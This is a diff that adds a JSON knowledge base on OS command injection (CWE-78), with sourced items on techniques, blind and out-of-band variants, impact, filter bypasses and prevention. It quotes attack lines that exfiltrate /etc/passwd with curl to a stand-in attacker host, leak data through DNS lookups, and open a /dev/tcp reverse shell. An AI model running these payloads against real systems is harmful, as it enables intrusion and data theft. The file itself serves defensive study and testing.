@@ -1,0 +1,228 @@
+{
+  "items": [
+    {
+      "item_key": "cmd-definition",
+      "class_id": "cmd",
+      "kind": "vulnerability_definition",
+      "claim": "OS command injection (CWE-78) lets an attacker inject and execute arbitrary operating-system commands on the server by passing unsanitized user input into a shell command interpreter.",
+      "body": "OS command injection (also known as shell injection) arises when an application incorporates user-controllable data into a command processed by a shell command interpreter. An attacker who controls the input can use shell metacharacters to modify the executed command and inject arbitrary additional commands. Because the commands run with the privileges of the vulnerable application, the impact is frequently remote code execution and full server compromise, and the server can be used to pivot into the internal network. The weakness is catalogued as CWE-78 (Improper Neutralization of Special Elements used in an OS Command) and belongs to the OWASP Top 10 A03:2021 Injection category. The same root cause (mixing data and commands) appears in SQL injection, but command injection targets the OS shell instead of the application runtime.",
+      "disproof": "Command injection is NOT code injection: code injection adds code that the application runtime executes, whereas command injection extends the application's ability to run OS commands. The vulnerability is also not mitigated by simple blacklist filtering of shell metacharacters: PortSwigger explicitly warns that escaping shell metacharacters is too error-prone and bypassable, and the CWE-78 subtypes show that even an attacker-controlled argument for a fixed program (e.g. nslookup) is exploitable if command separators are not removed.",
+      "severity_hint": "High",
+      "hunting_value": 5,
+      "sources": [
+        {
+          "url": "https://portswigger.net/web-security/os-command-injection",
+          "source_type": "vulnerability_testing_guide",
+          "host": "portswigger.net",
+          "publisher": "PortSwigger Ltd",
+          "quote": "OS command injection is also known as shell injection. It allows an attacker to execute operating system (OS) commands on the server that is running an application, and typically fully compromise the application and its data. Often, an attacker can leverage an OS command injection vulnerability to compromise other parts of the hosting infrastructure, and exploit trust relationships to pivot the attack to other systems within the organization.",
+          "locator": "What is OS command injection?"
+        },
+        {
+          "url": "https://cwe.mitre.org/data/definitions/78.html",
+          "source_type": "standard",
+          "host": "cwe.mitre.org",
+          "publisher": "MITRE",
+          "quote": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command before it is sent to a downstream component.",
+          "locator": "Description / Extended Description"
+        },
+        {
+          "url": "https://community.owasp.org/attacks/Command_Injection",
+          "source_type": "industry_guidance",
+          "host": "community.owasp.org",
+          "publisher": "OWASP Foundation",
+          "quote": "Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell.",
+          "locator": "Description"
+        }
+      ]
+    },
+    {
+      "item_key": "cmd-techniques",
+      "class_id": "cmd",
+      "kind": "injection_techniques",
+      "claim": "Attackers chain or substitute commands using shell metacharacters that differ between Windows and Unix, so the return channel (in-band output vs blind) determines which technique works.",
+      "body": "A number of command separators work on both Windows and Unix: & (background/separator), &&, |, ||. Unix-only separators: ; and newline (0x0a). Unix also supports inline execution via backticks (`cmd`) and $ (cmd) command substitution. The different behaviors matter: & separates commands so the trailing original argument cannot abort the injected command, while newline separates instructions like a script. Input that is quoted in the original command must first be terminated before metacharacters can inject a new command. Idiosyncrasies across shells mean a payload that yields in-band output in one chain may only be exploitable blind in another.",
+      "disproof": "Not every injected payload produces visible output: command separators differ between Windows and Unix, and inline substitution/backgrounding behave differently, so the same parameter may be exploitable with & but not with ;, or only via a blind/OAST channel. Blind input is still exploitable through time delays and out-of-band calls.",
+      "severity_hint": "Medium",
+      "hunting_value": 4,
+      "sources": [
+        {
+          "url": "https://portswigger.net/web-security/os-command-injection",
+          "source_type": "vulnerability_testing_guide",
+          "host": "portswigger.net",
+          "publisher": "PortSwigger Ltd",
+          "quote": "A number of characters function as command separators, allowing commands to be chained together. The following command separators work on both Windows and Unix-based systems: & - && - | - ||. The following command separators work only on Unix-based systems: ; - Newline. On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command: ` injected command ` - $(injected command).",
+          "locator": "Ways of injecting OS commands"
+        },
+        {
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
+          "source_type": "defense_guide",
+          "host": "cheatsheetseries.owasp.org",
+          "publisher": "OWASP",
+          "quote": "Allowlist Regular Expression: Where a list of good, allowed characters and the maximum length of the string are defined. Ensure that metacharacters like ones specified in Note A and whitespaces are not part of the Regular Expression. For example, the following regular expression only allows lowercase letters and numbers and does not contain metacharacters. The length is also being limited to 3-10 characters: ^[a-z0-9]{3,10}$",
+          "locator": "Defense Option 3, Layer 2 Input Validation"
+        },
+        {
+          "url": "https://www.yeswehack.com/learn-bug-bounty/ultimate-guide-os-command-injection",
+          "source_type": "bug_bounty_guide",
+          "host": "yeswehack.com",
+          "publisher": "YesWeHack",
+          "quote": "However, if user input is not sanitised properly before being incorporated into the system command, an attacker can insert a payload such as: 127.0.0.1' && ls -an / # -",
+          "locator": "Classic (direct) OS command injection example"
+        }
+      ]
+    },
+    {
+      "item_key": "cmd-blind",
+      "class_id": "cmd",
+      "kind": "variant",
+      "claim": "Blind command injection occurs when the application does not return injected command output in the HTTP response; it is confirmed and exploited with time delays, output redirection to a readable file, and out-of-band (OAST) channels.",
+      "body": "In blind OS command injection the application's response does not include command stdout. Detection uses time delays: injecting a command that pauses the shell (e.g. ; sleep 10 on Linux or & timeout 10 on Windows) and measuring the extra response time. Output can be redirected into a file inside the web root and retrieved over HTTP (e.g. & whoami > /var/www/static/whoami.txt &). OAST techniques force the server to make outbound network interactions: nslookup attacker-domain, curl, or ping, with the output exfiltrated in DNS sublabels or HTTP request bodies (e.g. nslookup `whoami`.attacker-domain, curl http://attacker/ -X POST -d \"$(cat /etc/passwd)\").",
+      "disproof": "The absence of command output in the response does not mean the injection is unexploitable: the command can be executed and its effect observed through side channels (delayed response, a file later fetched, or an outbound DNS/HTTP pingback), so blind findings are still high-value.",
+      "severity_hint": "Medium",
+      "hunting_value": 4,
+      "sources": [
+        {
+          "url": "https://portswigger.net/web-security/os-command-injection",
+          "source_type": "vulnerability_testing_guide",
+          "host": "portswigger.net",
+          "publisher": "PortSwigger Ltd",
+          "quote": "Blind OS command injection vulnerabilities: the application does not return the output from the command within its HTTP response. ... You can use an injected command to trigger a time delay ... You can redirect the output from the injected command into a file within the web root ... use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques, for example & nslookup kgji2ohoyw.web-attacker.com &",
+          "locator": "Blind OS command injection vulnerabilities"
+        },
+        {
+          "url": "https://www.yeswehack.com/learn-bug-bounty/ultimate-guide-os-command-injection",
+          "source_type": "bug_bounty_guide",
+          "host": "yeswehack.com",
+          "publisher": "YesWeHack",
+          "quote": "Blind OS command injection occurs when an attacker is able to execute system commands but the vulnerable application does not return the command output (stdout) to the attacker. ... the attacker can send a payload containing a reverse shell such as sh -i >& /dev/tcp/1.2.3.3/1337 0>&1 which, when executed on the target, establishes a connection back to the attacker",
+          "locator": "Blind OS command injection"
+        },
+        {
+          "url": "https://secra.es/en/blog/os-command-injection",
+          "source_type": "security_blog",
+          "host": "secra.es",
+          "publisher": "Secra",
+          "quote": "Blind command injection ... the attacker turns to indirect channels to confirm execution: Time-based: inject a controlled delay ... Out-of-band (OAST): forces the server to generate outbound traffic toward a controlled domain, with nslookup attacker.oast.example, curl or ping. ... Redirect to a readable file: writing the output to the web root with > /var/www/html/out.txt and reading it afterwards over HTTP.",
+          "locator": "Variants: blind and time-based injection"
+        }
+      ]
+    },
+    {
+      "item_key": "cmd-impact",
+      "class_id": "cmd",
+      "kind": "impact",
+      "claim": "OS command injection is a high/critical-impact flaw: it yields remote code execution with the application's privileges, full server compromise, and the ability to pivot, escalate, exfiltrate data, and maintain persistence.",
+      "body": "Executed with the privileges of the vulnerable process, injected commands can read configuration files containing credentials, establish reverse shells, download post-exploitation tools, move laterally across the internal network, encrypt data, or deploy persistent implants. If the process runs as root or another highly privileged account, the compromise is total. The server becomes a platform for further attacks: pivoting to internal systems and creating footholds that survive the original fix. Real-world impact is documented in widely exploited vulnerabilities: CVE-2019-25224 (WordPress Database Backup plugin via mysqldump, unauthenticated RCE), CVE-2024-3400 (PAN-OS GlobalProtect, unauthenticated RCE), CVE-2024-21887 (Ivanti Connect Secure, chained with authentication bypass), and CVE-2014-6271 (Shellshock, RCE via Bash environment handling).",
+      "disproof": "Command injection is not limited to disclosure of a single file or a trivially low-privilege account: it is a complete server compromise primitive when the process has elevated rights, and even limited-privilege executions chain into pivot, persistence, and data theft. Its severity is why PortSwigger rates it typically High and why it is also listed among the CWE top-25 rank 9 OS command injection weaknesses.",
+      "severity_hint": "Critical",
+      "hunting_value": 5,
+      "sources": [
+        {
+          "url": "https://portswigger.net/kb/issues/00100100_os-command-injection",
+          "source_type": "documentation",
+          "host": "portswigger.net",
+          "publisher": "PortSwigger Ltd",
+          "quote": "OS command Injection is a critical vulnerability that allows attackers to gain complete control over an affected web site and the underlying web server. ... an attacker can leverage a command injection vulnerability to pivot the attack in the organization's internal infrastructure, potentially accessing any system which the web server can access. They may also be able to create a persistent foothold within the organization, continuing to access compromised systems even after the original vulnerability has been fixed.",
+          "locator": "What is OS command injection?"
+        },
+        {
+          "url": "https://secra.es/en/blog/os-command-injection",
+          "source_type": "security_blog",
+          "host": "secra.es",
+          "publisher": "Secra",
+          "quote": "The outcome is usually direct and devastating: remote code execution (RCE) with the privileges of the vulnerable process and, in many cases, a full server takeover. ... an attacker can read configuration files containing credentials, move laterally across the internal network, encrypt data or deploy a persistent implant. If the process runs as root or as a user with broad privileges, the server compromise is total.",
+          "locator": "Real business impact: from execution to server takeover"
+        },
+        {
+          "url": "https://www.yeswehack.com/learn-bug-bounty/ultimate-guide-os-command-injection",
+          "source_type": "bug_bounty_guide",
+          "host": "yeswehack.com",
+          "publisher": "YesWeHack",
+          "quote": "OS command injection (CWE-78) is among the most severe vulnerability types because it allows attackers to execute arbitrary commands on target systems, often leading to full system compromise. ... Consider the real-world example of CVE-2019-25224, which affected the WordPress Database Backup plugin via the mysqldump function. This vulnerability allowed unauthenticated attackers to execute arbitrary commands on the host operating system.",
+          "locator": "Impact of OS command injection vulnerabilities"
+        }
+      ]
+    },
+    {
+      "item_key": "cmd-bypass",
+      "class_id": "cmd",
+      "kind": "bypass_and_tips",
+      "claim": "Implementing input validation requires care: blacklist filtering of shell metacharacters is fragile, escaping is unreliable, and even supposedly-safe escaping functions (escapeshellcmd) can be bypassed with argument injection; the robust path combines whitelists, parameterized APIs, and least privilege.",
+      "body": "Do not rely on escaping shell metacharacters: PortSwigger states this is too error-prone and bypassable. OWASP's cheat sheet lists the characters that must be excluded from allowlists (& | ; $ > < ` \\ ! ' \" ( )). In PHP, escapeshellarg() (single-quote wrapping, one argument) is preferred over escapeshellcmd() (which still permits argument injection, e.g. a URL payload like --directory-prefix=. can override an option and achieve RCE). If the wrong program or argument is chosen, argument injection (CWE-88) can change the behavior of an existing command even when a shell metacharacter filter works. Practical tips: test with harmless markers (& echo, whoami > web-root file, time delays), use the most specific separator that fits the environment, URL-encode and double-URL-encode payloads during testing, and confirm execution out-of-band when output is not returned. Defense-in-depth: least privilege for the service, egress filtering to detect OAST traffic, and monitoring of anomalous child processes.",
+      "disproof": "Validation/escaping defenses fail in practice: escapeshellcmd does not stop option injection, a single strict allowlist cannot cover every legitimate input shape (e.g. a mail subject containing ; and >), and client-side checks are trivially bypassed. Blind/escaped contexts require indirect confirmation rather than direct output.",
+      "severity_hint": "Medium",
+      "hunting_value": 3,
+      "sources": [
+        {
+          "url": "https://portswigger.net/web-security/os-command-injection",
+          "source_type": "vulnerability_testing_guide",
+          "host": "portswigger.net",
+          "publisher": "PortSwigger Ltd",
+          "quote": "Never attempt to sanitize input by escaping shell metacharacters. In practice, this is just too error-prone and vulnerable to being bypassed by a skilled attacker.",
+          "locator": "How to prevent OS command injection attacks"
+        },
+        {
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
+          "source_type": "defense_guide",
+          "host": "cheatsheetseries.owasp.org",
+          "publisher": "OWASP",
+          "quote": "If the user provides http://victim.com/download.php?url=--directory-prefix=. http://attacker.com/malicious.php, escapeshellcmd() will still allow this extra parameter meaning the attacker can override the original --directory-prefix option, save the file in the current directory and then achieve remote command execution on the server.",
+          "locator": "Defense option 2, PHP escapeshellcmd example"
+        },
+        {
+          "url": "https://www.yeswehack.com/learn-bug-bounty/ultimate-guide-os-command-injection",
+          "source_type": "bug_bounty_guide",
+          "host": "yeswehack.com",
+          "publisher": "YesWeHack",
+          "quote": "OS command injection involves the injection of an entirely new system command, whereas argument injection allows an attacker to modify the behaviour of an existing command by injecting additional arguments.",
+          "locator": "OS command injection vs argument injection (CWE-77 vs CWE-88)"
+        }
+      ]
+    },
+    {
+      "item_key": "cmd-prevention",
+      "class_id": "cmd",
+      "kind": "prevention",
+      "claim": "The primary defense is to avoid invoking OS commands from application code; where that is unavoidable, use parameterized/argument-list APIs, strict allowlist validation, and least privilege as defense in depth.",
+      "body": "Prefer library functions that cannot be manipulated into executing unintended commands (mkdir instead of system('mkdir ...'), execFile/spawn with arguments passed as a list, ProcessBuilder with the command and arguments separated, Runtime.exec without a shell). If a command must be used, layer defenses: validate the command against a whitelist and validate arguments with positive allowlist regular expressions that exclude metacharacters and whitespace; quote each argument and escape special characters after validation; use -- to end option parsing where the utility supports it; run the service with the least privilege required, ideally an isolated account or sandbox/jail, and filter egress to detect out-of-band traffic. The two-layer defense (parameterization + input validation) mitigates even if input validation is circumvented.",
+      "disproof": "OS commands are not always avoidable: legacy servers, mail, image conversion (ImageMagick), and diagnostics (ping) still require an external process, so relying solely on a blacklist or on a single function is insufficient; the two-layer defense only works if both layers are implemented and the process is not over-privileged.",
+      "severity_hint": "Medium",
+      "hunting_value": 3,
+      "sources": [
+        {
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
+          "source_type": "defense_guide",
+          "host": "cheatsheetseries.owasp.org",
+          "publisher": "OWASP",
+          "quote": "The primary defense is to avoid calling OS commands directly. Built-in library functions are a very good alternative to OS Commands, as they cannot be manipulated to perform tasks other than those it is intended to do.",
+          "locator": "Primary Defenses, Defense Option 1"
+        },
+        {
+          "url": "https://portswigger.net/kb/issues/00100100_os-command-injection",
+          "source_type": "documentation",
+          "host": "portswigger.net",
+          "publisher": "PortSwigger Ltd",
+          "quote": "The user data should be strictly validated. Ideally, a whitelist of specific accepted values should be used. Otherwise, only short alphanumeric strings should be accepted. Input containing any other data, including any conceivable shell metacharacter or whitespace, should be rejected. The application should use command APIs that launch a specific process via its name and command-line parameters, rather than passing a command string to a shell interpreter that supports command chaining and redirection.",
+          "locator": "Remediation: OS command injection"
+        },
+        {
+          "url": "https://cwe.mitre.org/data/definitions/78.html",
+          "source_type": "standard",
+          "host": "cwe.mitre.org",
+          "publisher": "MITRE",
+          "quote": "Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. ... When constructing OS command strings, use stringent allowlists that limit the character set based on the expected value of the parameter in the request. ... Proper output encoding, escaping, and quoting is the most effective solution for preventing OS command injection.",
+          "locator": "Implementation Strategy: Input Validation"
+        },
+        {
+          "url": "https://secra.es/en/blog/os-command-injection",
+          "source_type": "security_blog",
+          "host": "secra.es",
+          "publisher": "Secra",
+          "quote": "The single most important measure is not to invoke the system shell. ... use APIs that receive the executable and its arguments as separate elements of an array (execFile, subprocess.run with shell=False, ProcessBuilder), so that input is never interpreted as shell syntax.",
+          "locator": "How to prevent command injection"
+        }
+      ]
+    }
+  ]
+}
